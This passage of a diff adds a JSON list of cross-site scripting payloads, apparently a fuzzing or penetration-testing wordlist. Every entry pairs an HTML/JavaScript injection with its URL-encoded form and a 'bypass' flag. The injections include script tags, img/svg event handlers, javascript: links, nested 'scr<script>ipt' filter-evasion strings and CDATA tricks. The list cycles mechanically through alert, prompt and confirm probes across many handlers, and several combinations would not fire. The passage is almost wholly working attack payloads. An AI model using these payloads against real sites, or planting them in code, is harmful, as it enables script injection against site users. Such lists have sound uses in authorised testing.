+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=prompt(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dprompt%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=alert(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dalert%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dconfirm%282%29%3E"
